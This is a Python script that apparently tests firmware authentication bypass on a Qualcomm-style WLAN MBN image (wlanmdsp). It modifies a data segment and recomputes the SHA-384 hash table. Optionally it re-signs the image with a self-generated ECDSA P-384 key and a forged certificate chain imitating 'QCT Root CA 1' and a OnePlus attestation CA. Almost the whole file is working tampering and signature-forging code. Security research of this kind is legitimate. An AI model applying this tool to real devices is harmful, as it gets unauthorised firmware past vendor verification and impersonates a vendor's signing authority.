#!/usr/bin/env python3
"""
WLAN firmware MBN re-signing tool.
Tests authentication bypass by:
1. Modifying firmware data
2. Updating SHA-384 hashes to match
3. Optionally re-signing with our own ECDSA P-384 keys
"""

import struct
import hashlib
import sys
import os

def parse_elf_phdrs(data):
    """Parse ELF32 program headers"""
    e_phoff = struct.unpack_from('<I', data, 28)[0]
    e_phnum = struct.unpack_from('<H', data, 44)[0]
    phdrs = []
    for i in range(e_phnum):
        off = e_phoff + i * 32
        fields = struct.unpack_from('<IIIIIIII', data, off)
        phdrs.append({
            'type': fields[0], 'offset': fields[1], 'vaddr': fields[2],
            'paddr': fields[3], 'filesz': fields[4], 'memsz': fields[5],
            'flags': fields[6], 'align': fields[7]
        })
    return phdrs

def get_hash_table_info(hash_seg):
    """Parse hash table header"""
    fields = struct.unpack_from('<12I', hash_seg, 0)
    return {
        'image_type': fields[0],
        'version': fields[1],
        'total_size': fields[4],
        'hash_size': fields[5],
        'sig_ptr': fields[6],
        'sig_size': fields[7],
        'cert_ptr': fields[8],
        'cert_size': fields[9],
        'metadata_size': fields[11],
    }

def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else 'hash_only'

    with open('wlanmdsp_original.mbn', 'rb') as f:
        data = bytearray(f.read())

    phdrs = parse_elf_phdrs(data)
    hash_phdr = phdrs[1]  # PH[1] is hash segment
    hash_offset = hash_phdr['offset']  # 0x1000
    hash_size = hash_phdr['filesz']    # 0x1A60

    info = get_hash_table_info(data[hash_offset:hash_offset+48])
    metadata_size = info['metadata_size']  # 0x78
    num_entries = len(phdrs)  # 7 segments = 8 entries (entry 0 is reserved)

    print(f"Hash segment at file offset {hash_offset:#x}, size {hash_size:#x}")
    print(f"Metadata size: {metadata_size:#x}, entries: {num_entries+1}")
    print(f"Sig size: {info['sig_size']:#x}, cert size: {info['cert_size']:#x}")

    # === Step 1: Modify RODATA (PH[5]) ===
    rodata_phdr = phdrs[5]
    mod_offset = rodata_phdr['offset'] + 0x100  # Offset within RODATA
    original_byte = data[mod_offset]
    new_byte = original_byte ^ 0x20  # Toggle case bit
    print(f"\nModifying byte at file offset {mod_offset:#x}: {original_byte:#x} -> {new_byte:#x}")
    data[mod_offset] = new_byte

    # === Step 2: Recompute SHA-384 hash for modified segment ===
    # Hash entries: 8 entries of 48 bytes each starting at offset metadata_size (0x78) within hash segment
    # Entry mapping: entry 0=reserved, entry 1=PH[0], entry 2=zeros(PH[1]), entry 3=PH[2], ...
    # Entry i+1 = SHA384(PH[i]) for i >= 0, except entry 2 (PH[1] = hash seg itself)

    for i, ph in enumerate(phdrs):
        if i == 1:  # Skip hash segment (always zeros)
            continue
        if ph['filesz'] == 0:
            continue

        seg_data = data[ph['offset']:ph['offset'] + ph['filesz']]
        new_hash = hashlib.sha384(seg_data).digest()

        entry_idx = i + 1  # Entry 1 = PH[0], Entry 3 = PH[2], etc.
        if i >= 2:
            entry_idx = i + 1  # entries 3,4,5,6,7 = PH[2,3,4,5,6]

        hash_entry_offset = hash_offset + metadata_size + entry_idx * 48
        old_hash = data[hash_entry_offset:hash_entry_offset + 48]

        if old_hash != new_hash:
            print(f"  PH[{i}] hash CHANGED - updating entry {entry_idx} at file offset {hash_entry_offset:#x}")
            data[hash_entry_offset:hash_entry_offset + 48] = new_hash
        else:
            print(f"  PH[{i}] hash unchanged")

    if mode == 'hash_only':
        # Don't update signature - test if hash-only check works
        outfile = 'wlanmdsp_hashfix.mbn'
        with open(outfile, 'wb') as f:
            f.write(data)
        print(f"\nWrote {outfile} (hash updated, signature NOT updated)")
        print("If this loads: only hash checking, no signature verification!")
        return

    if mode == 'resign':
        try:
            from cryptography.hazmat.primitives.asymmetric import ec
            from cryptography.hazmat.primitives import hashes, serialization
            from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature, encode_dss_signature
            from cryptography import x509
            from cryptography.x509.oid import NameOID
            import datetime
        except ImportError:
            print("ERROR: pip3 install cryptography")
            return

        # Generate our own P-384 key
        our_key = ec.generate_private_key(ec.SECP384R1())
        print("\nGenerated new ECDSA P-384 key pair")

        # The signed data is: metadata (0x78 bytes) + hash entries (8 * 48 = 384 bytes) = 504 bytes
        signed_data_start = hash_offset
        signed_data_end = hash_offset + metadata_size + (num_entries + 1) * 48
        signed_data = bytes(data[signed_data_start:signed_data_end])

        print(f"Signing {len(signed_data)} bytes of hash table data")

        # Sign with our key
        signature = our_key.sign(signed_data, ec.ECDSA(hashes.SHA384()))

        # Decode the DER signature to get r, s
        r, s = decode_dss_signature(signature)
        print(f"New signature: r={r:096x}")
        print(f"               s={s:096x}")

        # Encode as DER
        new_sig_der = encode_dss_signature(r, s)

        # Signature location in file
        sig_file_offset = hash_offset + metadata_size + (num_entries + 1) * 48
        old_sig_size = info['sig_size']  # 0x68 = 104 bytes

        print(f"Replacing signature at file offset {sig_file_offset:#x}")
        print(f"Old sig size: {old_sig_size}, new sig size: {len(new_sig_der)}")

        # Pad or truncate new signature to match old size
        if len(new_sig_der) <= old_sig_size:
            new_sig_padded = new_sig_der + b'\x00' * (old_sig_size - len(new_sig_der))
        else:
            print(f"WARNING: new signature ({len(new_sig_der)}) larger than slot ({old_sig_size})!")
            return

        data[sig_file_offset:sig_file_offset + old_sig_size] = new_sig_padded

        # Create self-signed root certificate
        root_key = our_key  # Use same key for simplicity

        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "California"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, "San Diego"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "ONEPLUS"),
            x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, "CDMA Technologies"),
            x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, "General Use Key"),
            x509.NameAttribute(NameOID.COMMON_NAME, "QCT Root CA 1"),
        ])

        root_cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(issuer)
            .public_key(root_key.public_key())
            .serial_number(1)
            .not_valid_before(datetime.datetime(2020, 6, 23))
            .not_valid_after(datetime.datetime(2040, 6, 18))
            .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=False)
            .add_extension(x509.KeyUsage(
                digital_signature=False, key_cert_sign=True, crl_sign=True,
                content_commitment=False, key_encipherment=False,
                data_encipherment=False, key_agreement=False,
                encipher_only=False, decipher_only=False
            ), critical=False)
            .sign(root_key, hashes.SHA384())
        )

        # CA cert
        ca_subject = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "CA"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, "SanDiego"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "ONEPLUS"),
            x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, "CDMA Technologies"),
            x509.NameAttribute(NameOID.COMMON_NAME, "ONEPLUS Attestation CA"),
        ])

        ca_cert = (
            x509.CertificateBuilder()
            .subject_name(ca_subject)
            .issuer_name(issuer)
            .public_key(root_key.public_key())
            .serial_number(5)
            .not_valid_before(datetime.datetime(2020, 6, 23))
            .not_valid_after(datetime.datetime(2040, 6, 18))
            .add_extension(x509.BasicConstraints(ca=True, path_length=0), critical=False)
            .add_extension(x509.KeyUsage(
                digital_signature=False, key_cert_sign=True, crl_sign=False,
                content_commitment=False, key_encipherment=False,
                data_encipherment=False, key_agreement=False,
                encipher_only=False, decipher_only=False
            ), critical=False)
            .sign(root_key, hashes.SHA384())
        )

        # Attestation cert
        attest_subject = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "California"),
            x509.NameAttribute(NameOID.COMMON_NAME, "SecTools Test User"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "SecTools"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, "San Diego"),
        ])

        attest_cert = (
            x509.CertificateBuilder()
            .subject_name(attest_subject)
            .issuer_name(ca_subject)
            .public_key(root_key.public_key())
            .serial_number(1)
            .not_valid_before(datetime.datetime(2020, 12, 18))
            .not_valid_after(datetime.datetime(2040, 12, 13))
            .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=False)
            .add_extension(x509.KeyUsage(
                digital_signature=True, key_cert_sign=False, crl_sign=False,
                content_commitment=False, key_encipherment=False,
                data_encipherment=False, key_agreement=False,
                encipher_only=False, decipher_only=False
            ), critical=False)
            .add_extension(x509.ExtendedKeyUsage([x509.oid.ExtendedKeyUsageOID.CODE_SIGNING]), critical=False)
            .sign(root_key, hashes.SHA384())
        )

        # Serialize certificates
        attest_der = attest_cert.public_bytes(serialization.Encoding.DER)
        ca_der = ca_cert.public_bytes(serialization.Encoding.DER)
        root_der = root_cert.public_bytes(serialization.Encoding.DER)

        new_cert_chain = attest_der + ca_der + root_der

        print(f"Cert chain: attest={len(attest_der)}B + ca={len(ca_der)}B + root={len(root_der)}B = {len(new_cert_chain)}B")

        # Replace cert chain
        cert_file_offset = sig_file_offset + old_sig_size
        old_cert_size = info['cert_size']  # 0x1800 = 6144 bytes

        print(f"Old cert chain size: {old_cert_size}, new: {len(new_cert_chain)}")

        if len(new_cert_chain) <= old_cert_size:
            new_cert_padded = new_cert_chain + b'\x00' * (old_cert_size - len(new_cert_chain))
            data[cert_file_offset:cert_file_offset + old_cert_size] = new_cert_padded
        else:
            print("ERROR: new cert chain too large!")
            return

        outfile = 'wlanmdsp_resigned.mbn'
        with open(outfile, 'wb') as f:
            f.write(data)
        print(f"\nWrote {outfile} (hash updated + re-signed with our keys)")
        print("If this loads: root cert is NOT fuse-verified!")

if __name__ == '__main__':
    main()
